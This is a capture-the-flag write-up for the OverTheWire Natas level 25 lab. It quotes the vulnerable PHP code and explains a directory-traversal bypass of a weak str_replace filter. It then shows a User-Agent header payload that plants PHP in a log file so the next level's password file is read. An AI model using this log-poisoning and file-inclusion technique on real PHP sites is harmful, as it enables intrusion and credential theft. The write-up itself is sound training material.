I begin with code analyzing. This function: 

```
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```

is interesting because by performing directory traversal, there is access to this file by generating the request to the following URL:
```
http://natas25.natas.labs.overthewire.org/?lang=.../...//logs/natas25_<put_your_sessionid_here>.log
```
the file content is returned. The beginning of file location is
.../.../ because there is an insecure way of protection against directory traversal. Function str_replace from this data produce ../ and this is way attacker wants. So now, when I have access to this file, I only need to put a password in that file. Directly reading the file with the password is impossible because of that part:
```
if(strstr($filename,"natas_webpass")){
    logRequest("Illegal file access detected! Aborting!");
    exit(-1);
}
```
this code checks the presence of "natas_webpass" in the location link if it presents return -1.
Based on the first part of the code in this post, you can see that the data to the file is taken from the "user_agent" parameter. So code for stealing password can be injected via this param, the code with doing this is:
```
<? readfile("/etc/natas_webpass/natas26") ?>
```

After submitting a request modified in that way, the password is in a log file.
